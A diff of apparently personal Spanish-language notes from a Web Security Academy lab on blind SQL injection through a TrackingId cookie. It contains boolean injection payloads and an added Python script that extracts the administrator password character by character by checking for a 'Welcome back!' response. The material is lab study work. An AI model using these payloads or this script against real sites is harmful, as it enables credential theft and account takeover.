@@ -156,7 +156,48 @@ TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users limit 1) = 'a'-- - --> a
 >> Averiguar longitud de la contraseña 
 TrackingId=q8JZjDAPSH5UYtS9' and (select 'a' from users where username='administrator' and length(password)=20) = 'a'-- -
 
+############################# SCRIPT ITERACIÓN CONTRASEÑA ##########################################
+#!/usr/bin/python3
 
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+def def_handler(sig, frame):
+        print("[!] Saliendo...\n")
+        sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+main_url = "https://0ac6001c0327ef7d80e32b0800fb006d.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+
+def makeRequest():
+        password = ""
+
+        p1 = log.progress("Fuerza bruta")
+        p1.status("Iniciando ataque de fuerza bruta")
+
+        time.sleep(2)
+        p2 = log.progress("Password")
+
+        for position in range(1,21):
+                for character in characters:
+                        cookies = {
+                        'TrackingId' : "q8JZjDAPSH5UYtS9' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position,character),
+                        'session' : "ZogtQ3wSKyrO1itrib965BerXVKJLpZe"
+                        }
+                        p1.status(cookies['TrackingId'])
+                        r = requests.get(main_url, cookies=cookies)
+
+                        if "Welcome back!" in r.text:
+                                password += character
+                                p2.status(password)
+                                break
+
+if __name__ == '__main__':
+        makeRequest()
+
+########################################################################################################################################################################
 
 
 
